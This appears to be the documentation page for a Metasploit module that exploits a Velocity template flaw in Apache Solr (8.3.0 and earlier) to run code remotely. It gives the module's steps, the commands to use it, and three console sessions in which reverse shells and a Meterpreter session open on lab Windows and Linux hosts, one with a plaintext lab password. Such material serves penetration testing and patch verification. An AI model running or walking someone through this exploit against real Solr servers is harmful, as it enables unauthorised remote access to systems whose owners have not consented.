## Introduction

**From the Tenable advisory**:
...an attacker could target a vulnerable Apache Solr instance by first identifying a list of Solr core names.
Once the core names have been identified, an attacker can send a specially crafted HTTP POST request to the Config API to toggle the params resource loader value for the Velocity Response Writer in the solrconfig.xml file to true.
Enabling this parameter would allow an attacker to use the velocity template parameter in a specially crafted Solr request, leading to RCE.
Currently, this vulnerability does not have a CVE assigned to it.

**Overview**
This module will carry out the following tasks in order during `check`:

1. Check if authentication is required.
2. If authentication is required and credentials are provided, attempt to authenticate using provided credentials. If successful, store creds and use them in subsequent requests.
3. Check victim's OS
4. Enumerate Solr cores
5. Check configuration of each Solr core to determine if `params.resource.loader.enabled` is `true`

And during `exploit`:

1. Run `check` to see if victim is vulnerable
2. Attempt to change `params.resource.loader.enabled` to `true` if it isn't already set to `true`
3. Check if selected target and OS of victim match. Abort if it doesn't match, continue if it does.
4. If victim's OS platform is `Windows` check for PowerShell. Abort if `PowerShell` is not present, continue if it is.
5. If victim's OS platform is `Unix` check for Bash. Abort if `Bash` is not present, continue if it is
6. Generate payload and place inside custom template
7. Exploit and gain access

Privileges gained are dependent on the user running Solr.
Currently, this module only supports basic auth.
Payload defaults to `windows/meterpreter/reverse_tcp` for Windows and `cmd/unix/reverse_bash` for Unix.

## Vulnerable Applications

- Apache Solr <= 8.3.0

## Verification Steps

1. Start `msfconsole`
2. `use exploit/multi/http/solr_velocity_rce`
3. `set RHOST <target_ip>`
4. `set RPORT <target_port>`
5. `set USERNAME <username>` (if applicable)
6. `set PASSWORD <password>` (if applicable)
7. Ideally run `check`
8. `set TARGET` based on output of `check`
9. `set PAYLOAD <payload_name>` if you want to use other payloads
10. `set LHOST <your_ip>`
11. `set LPORT <your_port>`
12. Optional: `set VERBOSE true` to get verbose output
13. Optional: `set TARGETURI <path_to_solr>` if target system uses a different path to Apache Solr
14. `exploit` and let the shells rain


## Examples

### Windows Server 2019 Datacenter, fully patched, Solr 8.3.0, no authentication
```
msf5 > use exploit/multi/http/solr_velocity_rce
msf5 exploit(multi/http/solr_velocity_rce) > set RHOSTS 172.16.252.129
RHOSTS => 172.16.252.129
msf5 exploit(multi/http/solr_velocity_rce) > check

[*] Found Apache Solr 8.3.0
[*] OS version is Windows Server 2019 amd64 10.0
[*] Found core(s): techproducts
[!] params.resource.loader.enabled for core techproducts is set to false.
[+] 172.16.252.129:8983 - The target is vulnerable.
msf5 exploit(multi/http/solr_velocity_rce) > set TARGET 1
TARGET => 1
msf5 exploit(multi/http/solr_velocity_rce) > set LHOST 172.16.252.1
LHOST => 172.16.252.1
msf5 exploit(multi/http/solr_velocity_rce) > exploit

[*] Started reverse TCP handler on 172.16.252.1:4444
[*] Found Apache Solr 8.3.0
[*] OS version is Windows Server 2019 amd64 10.0
[*] Found core(s): techproducts
[!] params.resource.loader.enabled for core techproducts is set to false.
[*] Targeting core 'techproducts'
[*] params.resource.loader.enabled is false, setting it to true...
[+] params.resource.loader.enabled is now set to true!
[+] PowerShell found, good to go!
[*] Sending stage (180291 bytes) to 172.16.252.129
[*] Meterpreter session 1 opened (172.16.252.1:4444 -> 172.16.252.129:50891) at 2019-12-29 11:49:39 +0800

meterpreter > sysinfo
Computer        : 2K19DTCTR
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: 2K19DTCTR\Administrator
meterpreter >
```

### Bitnami Solr VM 8.3.0, requiring basic authentication
```
msf5 > use exploit/multi/http/solr_velocity_rce
msf5 exploit(multi/http/solr_velocity_rce) > set RHOSTS 192.168.35.130
RHOSTS => 192.168.35.130
msf5 exploit(multi/http/solr_velocity_rce) > set RPORT 80
RPORT => 80
msf5 exploit(multi/http/solr_velocity_rce) > check

[!] Authentication required for 192.168.35.130:80!
[*] Attempting authentication for 192.168.35.130:80...
[*] 192.168.35.130:80 - Cannot reliably check exploitability. Authentication failed!
msf5 exploit(multi/http/solr_velocity_rce) > set USERNAME user
USERNAME => user
msf5 exploit(multi/http/solr_velocity_rce) > set PASSWORD j6lzH82e6Jc5
PASSWORD => j6lzH82e6Jc5
msf5 exploit(multi/http/solr_velocity_rce) > check

[!] Authentication required for 192.168.35.130:80!
[*] Attempting authentication for 192.168.35.130:80...
[+] Authentication succeeded!
[*] Found Apache Solr 8.3.0
[*] OS version is Linux amd64 4.9.0-11-amd64
[*] Found core(s): techproducts
[+] 192.168.35.130:80 - The target is vulnerable.
msf5 exploit(multi/http/solr_velocity_rce) > set TARGET 0
TARGET => 0
msf5 exploit(multi/http/solr_velocity_rce) > set LHOST 192.168.35.1
LHOST => 192.168.35.1
msf5 exploit(multi/http/solr_velocity_rce) > exploit

[*] Started reverse TCP handler on 192.168.35.1:4444
[*] Found Apache Solr 8.3.0
[*] OS version is Linux amd64 4.9.0-11-amd64
[*] Found core(s): techproducts
[*] Targeting core 'techproducts'
[+] Bash found, good to go!
[*] Command shell session 2 opened (192.168.35.1:4444 -> 192.168.35.130:59956) at 2019-12-29 11:51:52 +0800

uname -a
Linux debian 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux
id
uid=999(solr) gid=1002(solr) groups=1002(solr)

```

### Docker Solr 8.2.0, no authentication
```
msf5 > use exploit/multi/http/solr_velocity_rce
msf5 exploit(multi/http/solr_velocity_rce) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf5 exploit(multi/http/solr_velocity_rce) > check

[*] Found Apache Solr 8.2.0
[*] OS version is Linux amd64 5.3.0-kali3-amd64
[*] Found core(s): gettingstarted, techproducts
[+] 172.17.0.2:8983 - The target is vulnerable.
msf5 exploit(multi/http/solr_velocity_rce) > set LHOST 172.17.0.1
LHOST => 172.17.0.1
msf5 exploit(multi/http/solr_velocity_rce) > exploit

[*] Started reverse TCP handler on 172.17.0.1:4444
[*] Found Apache Solr 8.2.0
[*] OS version is Linux amd64 5.3.0-kali3-amd64
[*] Found core(s): gettingstarted, techproducts
[*] Targeting core 'gettingstarted'
[+] Bash found, good to go!
[*] Command shell session 3 opened (172.17.0.1:4444 -> 172.17.0.2:59340) at 2019-12-29 11:55:32 +0800

uname -a
Linux 2667812695e4 5.3.0-kali3-amd64 #1 SMP Debian 5.3.15-1kali1 (2019-12-09) x86_64 GNU/Linux
id
uid=8983(solr) gid=8983(solr) groups=8983(solr)
```
